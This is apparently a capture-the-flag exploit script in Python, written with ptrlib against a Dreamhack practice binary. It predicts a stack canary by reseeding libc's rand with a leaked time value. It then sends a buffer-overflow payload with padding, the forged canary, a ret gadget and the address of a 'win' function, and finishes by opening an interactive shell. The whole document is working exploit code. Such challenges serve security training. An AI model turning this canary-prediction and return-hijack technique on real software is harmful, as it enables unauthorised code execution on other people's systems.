import ctypes
from ptrlib import *

elf = ELF("./prob")

# sock = Process("./prob")
sock = Socket("nc host3.dreamhack.games 23200")
# sock.debug = True

v0 = int(sock.recvlineafter("time: "))
logger.info(f"time = {v0}")

libc = ctypes.CDLL("libc.so.6")
libc.srand(ctypes.c_uint(v0))
canary = 0
for i in range(8):
    v1 = canary << 8
    rand_value = libc.rand() & 0xFF
    canary = v1 | rand_value
logger.info(f"canary = {hex(canary)}")

payload = b"A" * 0x10
payload += p64(canary)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(next(elf.gadget("ret;")))
payload += p64(elf.symbol("win"))
sock.sendlineafter("input your data: ", payload)

sock.sh()
